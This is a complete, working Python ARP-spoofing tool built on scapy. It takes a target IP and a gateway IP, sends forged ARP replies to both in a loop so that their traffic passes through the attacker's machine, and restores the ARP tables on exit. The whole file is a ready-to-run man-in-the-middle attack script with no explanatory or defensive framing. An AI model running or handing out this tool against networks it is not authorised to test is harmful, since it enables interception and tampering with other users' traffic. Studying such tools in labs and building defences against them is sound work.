import scapy.all as scapy
import time
import argparse
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def spoof(target_ip, spoof_ip, target_mac=None):
    if target_mac is None:
        target_mac = get_mac(target_ip)
        if target_mac is None:
            print(f"[!] Could not get MAC address for {target_ip}. Exiting.")
            sys.exit(1)

    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip, dest_mac=None, source_mac=None):
    if dest_mac is None:
        dest_mac = get_mac(dest_ip)
    if source_mac is None:
        source_mac = get_mac(source_ip)

    if dest_mac is None or source_mac is None:
        print("[!] Could not get MAC addresses for restore. Exiting.")
        sys.exit(1)

    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False) #send 4 times for reliability

def get_arguments():
    parser = argparse.ArgumentParser(description="ARP spoofer")
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP, use --help for more info.")
    if not options.gateway:
        parser.error("[-] Please specify a gateway IP, use --help for more info.")
    return options

try:
    options = get_arguments()
    target_ip = options.target
    gateway_ip = options.gateway

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print("[!] Could not get MAC addresses. Exiting.")
        sys.exit(1)

    print("[+] Starting ARP spoofing...")
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip, target_mac)
        spoof(gateway_ip, target_ip, gateway_mac)
        sent_packets_count = sent_packets_count + 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2) # adjust as needed

except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C ..... Resetting ARP tables.....Please wait.")
    restore(target_ip, gateway_ip, target_mac, gateway_mac)
    restore(gateway_ip, target_ip, gateway_mac, target_mac)
    print("[+] ARP tables reset.")
    sys.exit()

except PermissionError:
    print("[!] Run this program as root.")
    sys.exit(1)